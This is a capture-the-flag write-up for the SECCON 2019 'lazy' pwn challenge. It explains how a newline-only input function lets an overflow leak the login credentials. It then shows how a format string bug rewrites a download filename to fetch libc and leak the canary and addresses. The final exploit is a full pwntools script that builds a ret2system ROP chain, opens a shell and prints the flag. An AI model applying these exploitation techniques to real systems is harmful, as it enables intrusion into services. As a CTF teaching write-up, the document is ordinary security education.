---
title: lazy 
ctf: "SECCON 2019 Online CTF"
tags: [seccon19, pwn, writeup, formatstring]
date: 2019-10-20
description: "Exploit a buffer overflow to bypass a login check, into a format string vulnerability to dump the binary and libc. Exploit another buffer overflow into a ROP-chain to get a shell."
---

**Points:** 332 (dynamic)
**Solves:** 43

## TLDR
1. Overflow to bypass login
2. Exfiltrate all relevant files (challenge binary and libc)
    - Format string to change the name of the file to be downloaded
3. Format String to get leaks
4. Buffer Overflow to build a ROP-chain and get a shell

## Recon and Reversing:

In this challenge we are simply given the server host:port combination: `lazy.chal.seccon.jp 33333`

Connecting to it with netcat, we get a menu with 3 options:
```
1: Public contents
2: Login
3: Exit
```

Looking at the public contents, we see a few notes from the program author and one of them contains a C source code file called `login.c` which I assumed was the code that ran when we chose the `2.login` option.

This is the login function:
```c
int login(void){
	char username[BUFFER_LENGTH];
	char password[BUFFER_LENGTH];
	char input_username[BUFFER_LENGTH];
	char input_password[BUFFER_LENGTH];

    memset(username,0x0,BUFFER_LENGTH);
	memset(password,0x0,BUFFER_LENGTH);
	memset(input_username,0x0,BUFFER_LENGTH);
	memset(input_password,0x0,BUFFER_LENGTH);

    strcpy(username,USERNAME);
	strcpy(password,PASSWORD);

	printf("username : ");
	input(input_username);
	printf("Welcome, %s\n",input_username);

	printf("password : ");
	input(input_password);

    if(strncmp(username,input_username,strlen(USERNAME)) != 0){
		puts("Invalid username");
		return 0;
	}

	if(strncmp(password,input_password,strlen(PASSWORD)) != 0){
		puts("Invalid password");
		return 0;
	}

	return 1;
```

This logic seems fine, so let's look at the `input` function:
 
``` c
void input(char *buf){
    int recv;
    int i = 0;
    while(1){
        recv = (int)read(STDIN_FILENO,&buf[i],1);
        if(recv == -1){
            puts("ERROR!");
            exit(-1);
        }
        if(buf[i] == '\n'){
            return;
        }
        i++;
    }
}
```

Ha ha! There's our overflow. The function will only stop reading when we encounter a `'\n'`.  
I used this to leak the username and password.

``` python
s = remote(HOST, PORT)

s.sendline("2")
s.sendline("A" * 31)
s.sendline("")
s.interactive()

```
```
username : Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
3XPL01717
```
```python
s = remote(HOST, PORT)

s.sendline("2")
s.sendline("A" * 63)
s.sendline("")

s.interactive()
```
```
username : Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
_H4CK3R_
```
So, we have `username = "_H4CK3R_"` and `password = "3XPL01717"`

After the login, we are presented with one more option: `4: Manage`.   
Selecting it shows us the following:
```
Welcome to private directory
You can download contents in this directory, but you can't download contents with a dot in the name
lazy
libc.so.6
Input file name
```

So I downloaded `lazy` and started analyzing the binary.  

```
╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
╰─$ file lazy
lazy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=21cd58cd5cf177c5dbd0f8259760130d8e6b0795, not stripped

╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
╰─$ checksec lazy
[*] '/home/vagrant/share/seccon19/pwn/lazy/lazy'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Reversing the binary, we can verify that it's exactly what's running on the server.
The `input` function used in the aforementioned login function is also used to ask user input in other areas of the code, so we have other possibly exploitable overflows.

In the `filter` function (function that processes the `4: Manage` menu option), we have the following code:
``` c 
char s[8];      // [sp+0h] [bp-20h]@1
__int64 v3;     // [sp+8h] [bp-18h]@1
int v4;         // [sp+10h] [bp-10h]@1
__int64 cookie; // [sp+18h] [bp-8h]@1

puts("You can download contents in this directory, but you can't download contents with a dot in the name");

listing("You can download contents in this directory, but you can't download contents with a dot in the name");

puts("Input file name");
input(s);
if ( strchr(s, '.') ) {
    puts("NO! You can not download this file!");
    exit(-1);
}
printf("Filename : ");
printf(s);
puts("OK! Downloading...");
download(s);
```

Here are two exploitable vulnerabilities:
1. Buffer overflow in the `s` buffer
2. Format String vulnerability when printing the file name

## Exploitation plan
We saw previously the binary has no **PIE**, but has **FULL RELRO** so it's impossible to overwrite the **GOT**. We can still use the GOT to get libc leaks, tho.

This limits our exploitation options. We can use the buffer overflow to control the RIP by overwriting the saved RIP on the stack, but we have to bypass the `stack canary`. Luckily, we can leak it with our format string. But where would we return to? The perfect solution would be a ret2libc attack, but we don't know the libc that is used and we can't just download it since the program checks for `.` in the filename before calling the `download` function.

This `download` is pretty straightforward and only does a couple of security checks:

```c
if ( strlen(file_name) > 27 ){
    puts("Too long!");
    exit(-1);
}
if ( strstr(file_name, "..") ){
    puts("No directory traversal!");
    exit(-1);
}
...
file_len = strlen(file_name);
strncat(&dest, file_name, file_len - 1);
fd = open(&dest, 0);
puts(&dest);
```
Then it just sends us the file contents.

## Getting the Libc
With a few tests, I figured out that our input is at offset 6 from the `printf(s)`, so we could access our input directly via the positional argument `"%6$s"`.
We can also offset the saved EBP in the stack and leak it by using the `"%10$p"` format. With this, we can calculate the address of our input on the stack.

```python
s = remote(HOST, PORT)

s.sendline("2")
s.sendline("_H4CK3R_")
s.sendline("3XPL01717")
s.sendline("4")

leak_to_input_offset = 0x60
leak_fmt = "%10$p"

s.sendline(leak_fmt)
s.recvuntil("Filename : ")
leak = int(s.recvline().strip(), 16)
input_addr = leak - leak_to_input_offset

log.info("leak = {}".format(hex(leak)))
log.info("input @ {}".format(hex(input_addr)))
```
```
╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
╰─$ python exploit_leaks.py remote
[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
[*] leak = 0x7ffe4ee73ce0
[*] input @ 0x7ffe4ee73c80
```

So, my goal is to give the program a format string that will modify itself to be "libc.so.6\x00".
Since the `download` function copies `strlen(file_name) - 1` bytes, we will have to write "libc.so.6X\x00", X being any byte != '\x00'.  
I used my *in development* format string library to help me calculating the paddings, but I had to edit the payload manually for it to work properly:

```python
...

# addresses to write on
sequence = "".join([p64(input_addr+i) for i in range(8)])
sequence += p64(input_addr+8)

fs = FormatString()
# first address will be at offset 23 (%23$hhn)
fs.write(23, u64("libc.so."), step=1)

payload = fs.payload()
# this is a dirty hack, but it got the job done
payload += "%" + str(0x3636 - fs.bytes_written_so_far) + "x" + "%31$n"
# pad the input so the the addresses are in a known  
# location at a specific offset
payload += "\x00" * (136 - len(payload)) + sequence

s.sendline("4")
s.sendline(payload)

# download libc
s.recvuntil("bytes")
libc_bin = s.recvall()
with open("libc.so.6", "wb") as f:
    f.write(libc_bin)
    f.close()
```
```
╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
╰─$ python exploit_leaks.py remote
[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
[*] leak = 0x7fff69245d50
[*] input @ 0x7fff69245cf0
[+] Receiving all data: Done (3.75MB)
```

## The Final Exploit
Unfortunately, for some reason I couldn't download the libc without it getting corrupted somehow, so I couldn't use `objdump` to find the function offsets.  
I decided to load it in a binary analysis program and look for known functions.   
I found this string: `GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.`.   
This led me to believe that it was not a standard glibc compiled by Ubuntu like it usually is, which means that the offsets will most likely differ.

None of the programs were able to parse it correctly, but I found some strings used in the `malloc` function so I used them to find out the offset of malloc inside the libc. I also quickly found out that some of the symbols would load correctly, so I managed to find `system` as well.  
I used `strings` with the -o option to find the offset of the "/bin/sh\x00" string.  

I also found a `pop rdi; ret` gadget in the binary itself. This allows us to try the standard `ret to system` attack.  
All that we need is to get a leak from a known function, like `malloc`, calculate the libc base and subsequently the addresses of system and the "/bin/sh\x00" string and use our overflow to overwrite the saved RIP.

The only obstacle is the canary, but we can just leak it first and just keep it unchanged.

This is the final exploit:
```python
HOST = "lazy.chal.seccon.jp"
PORT = 33333

s = remote(HOST, PORT)
username = "_H4CK3R_"
password = "3XPL01717"

# 0x00000000004015f3 : pop rdi ; ret
pop_rdi = 0x4015f3

libc_start_main = 0x20740
system_off = 0x3F570
malloc_off = 0x78560
bin_sh_off = 0x163c38

s.sendline("2")
s.sendline(username)
s.sendline(password)
s.sendline("4")

leak_fmt = "%7$sAAAA"
leak_fmt += p64(elf.got["malloc"])
s.sendline(leak_fmt)

s.recvuntil("Filename : ")
leak = u64(s.recv(6).ljust(8, "\x00"))

libc_base = leak - malloc_off
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off

log.info("leak {}".format(hex(leak)))
log.info("libc base  @ {}".format(hex(libc_base)))
log.info("system     @ {}".format(hex(system)))
log.info("/bin/sh    @ {}".format(hex(bin_sh)))

leak_fmt = "%9$llx"

s.sendline("4")
s.sendline(leak_fmt)

s.recvuntil("Filename : ")
cookie = int(s.recvline().strip(), 16)

log.info("stack cookie = {}".format(hex(cookie)))

leak_fmt = "%10$llx"

s.sendline("4")
s.sendline(leak_fmt)

s.recvuntil("Filename : ")
saved_ebp = int(s.recvline().strip(), 16)
log.info("saved_ebp = {}".format(hex(saved_ebp)))


s.sendline("4")
# AA so it doesn't crash on download
padding = "AA" + "\x00"*0x16
payload = padding + p64(cookie) + p64(saved_ebp) + p64(pop_rdi) + p64(bin_sh) + p64(system)

s.recvuntil("Input file name")
s.sendline(payload)
s.recvuntil("No such file!")

s.interactive()
```

Output: 
```
╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
╰─$ python exploit.py remote
[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
[*] leak 0x7f4351c05560
[*] libc base  @ 0x7f4351b8d000
[*] system     @ 0x7f4351bcc570
[*] /bin/sh    @ 0x7f4351cf0c38
[*] stack cookie = 0xdc27f3ac4b683800
[*] saved_ebp = 0x7fff2f338da0
[*] Switching to interactive mode

$ ls
810a0afb2c69f8864ee65f0bdca999d7_FLAG
cat
lazy
ld.so
libc.so.6
q
run.sh
$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG
SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
```

